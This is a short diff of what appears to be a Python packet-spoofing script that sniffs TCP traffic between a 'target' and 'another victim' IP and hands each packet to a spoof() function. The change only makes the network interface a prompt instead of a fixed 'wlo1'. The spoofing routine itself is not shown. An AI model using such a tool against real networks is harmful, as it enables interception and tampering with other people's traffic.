@@ -23,5 +23,6 @@ def spoof(pkt):
       
 targetip = input("Target IP: ")
 anothervictim = input("Another Victim IP: ") 
+iface = input("Network Interface you are using currently e.g. usb,wlo1,eth0: ")
 myfilter = 'tcp and src host '+anothervictim+' and dst host '+targetip
-sniff(iface='wlo1',filter="(ip src "+anothervictim+" and ip dst "+targetip + ")",prn=spoof)
+sniff(iface=iface,filter="(ip src "+anothervictim+" and ip dst "+targetip + ")",prn=spoof)
